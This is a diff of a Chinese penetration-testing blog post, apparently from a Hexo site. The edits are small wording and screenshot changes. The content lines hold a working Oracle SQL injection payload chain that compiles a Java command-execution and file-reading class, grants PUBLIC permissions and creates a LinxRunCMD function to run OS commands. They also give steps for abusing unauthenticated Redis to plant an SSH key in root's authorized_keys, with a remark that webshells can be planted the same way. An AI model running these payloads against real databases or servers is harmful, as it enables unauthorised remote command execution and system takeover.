@@ -177,7 +177,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-06 22:06:14" itemprop="dateModified" datetime="2021-04-06T22:06:14+08:00">2021-04-06</time>
+                <time title="修改时间：2021-04-07 14:56:46" itemprop="dateModified" datetime="2021-04-07T14:56:46+08:00">2021-04-07</time>
               </span>
 
           
@@ -272,36 +272,39 @@
 <img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406213502.PNG" style="zoom:150%;" />
 
 <p><img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406213507.PNG" alt="puser"></p>
-<p>本人不擅长oracle，这里直接使用了redn3ck大佬的payload</p>
-<p>1.创建java代码LinxUtil</p>
+<p>本人不擅长oracle，这里直接使用了redn3ck大佬的payload。</p>
+<p>1.创建java代码LinxUtil：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace and compile java source named &quot;LinxUtil&quot; as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;public static String readFile(String filename)&#123;try&#123;BufferedReader myReader&#x3D; new BufferedReader(new FileReader(filename)); String stemp,str&#x3D;&quot;&quot;;while ((stemp &#x3D; myReader.readLine()) !&#x3D; null) str +&#x3D;stemp+&quot;\n&quot;;myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
 
-<p>2.赋予public用户java权限</p>
+<p>2.赋予public用户java权限：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;begin dbms_java.grant_permission(&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;PUBLIC&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;SYS:java.io.FilePermission&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;,&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&lt;&gt;&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;, &#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;execute&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;);end;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
 
-<p>3.创建系统命令调用函数LinxRunCMD</p>
+<p>3.创建系统命令调用函数LinxRunCMD：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;LinxUtil.runCMD(java.lang.String) return String&#39;&#39;&#39;&#39;&#39;&#39;&#39;&#39;;&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
 
-<p>4.将LinxRunCMD函数执行权限赋予public用户</p>
+<p>4.将LinxRunCMD函数执行权限赋予public用户：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(&#39;FOO&#39;,&#39;BAR&#39;,&#39;DBMS_OUTPUT&quot;.PUT(:P1);EXECUTE IMMEDIATE &#39;&#39;DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE &#39;&#39;&#39;&#39;grant all on LinxRunCMD to public&#39;&#39;&#39;&#39;;END;&#39;&#39;;END;--&#39;,&#39;SYS&#39;,0,&#39;1&#39;,0) from dual</span><br></pre></td></tr></table></figure>
 
-<p>5.使用</p>
+<p>5.使用：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select sys.LinxRunCMD(&#39;whoami&#39;) from dual</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406213403.PNG" alt="cmd"></p>
 <p>接下来就是愉快的上线环节。</p>
 <h2 id="0x04-未授权访问redis利用SSH-key"><a href="#0x04-未授权访问redis利用SSH-key" class="headerlink" title="0x04 未授权访问redis利用SSH key"></a>0x04 未授权访问redis利用SSH key</h2><p>实战很少能用，一般遇到的redis权限都比较低。</p>
-<h4 id="1-前提-3"><a href="#1-前提-3" class="headerlink" title="1 前提"></a>1 前提</h4><p>需要高权限redis账户，能对目标文件夹写入。</p>
+<h4 id="1-前提-3"><a href="#1-前提-3" class="headerlink" title="1 前提"></a>1 前提</h4><p>需要高权限redis账户，能对目标文件夹写入操作。</p>
 <h4 id="2-开淦-3"><a href="#2-开淦-3" class="headerlink" title="2 开淦"></a>2 开淦</h4><p>在本地生成rsa密钥对：</p>
-<p>在/root/.ssh目录运行<code>ssh-keygen -t rsa</code>命令，然后一直回车，得到rsa密钥对。</p>
-<img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406215958.png" alt="image-20210406215958392" style="zoom:80%;" />
+<p>1.在/root/.ssh目录运行<code>ssh-keygen -t rsa</code>命令，然后一直回车，得到rsa密钥对。</p>
+<img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406222234.png" alt="image-20210406222234920" style="zoom:80%;" />
 
-<p>将公钥id-rsa.pub写入目标机/root/.ssh目录下的authorized_keys文件中：</p>
-<img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406220232.png" alt="set ssh" style="zoom:80%;" />
+<p>2.将公钥id-rsa.pub写入目标机/root/.ssh目录下的authorized_keys文件中：</p>
+<img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406222320.png" alt="image-20210406222320896" style="zoom:80%;" />
 
-<p>直接在.ssh目录下尝试用rsa文件连接目标机：</p>
-<p><img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406220343.png" alt="ssh"></p>
+<p>3.直接在.ssh目录下尝试用rsa文件连接目标机：</p>
+<img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406222401.png" alt="image-20210406222401862" style="zoom:80%;" />
+
 <p>成功，开始为所欲为。</p>
+<p><strong>可以利用相似的方法写入webshell，前提是知道绝对路径</strong></p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a target="_blank" rel="noopener" href="https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/">Oracle注入 - 命令执行&amp;Shell反弹</a></p>
 
       
     </div>
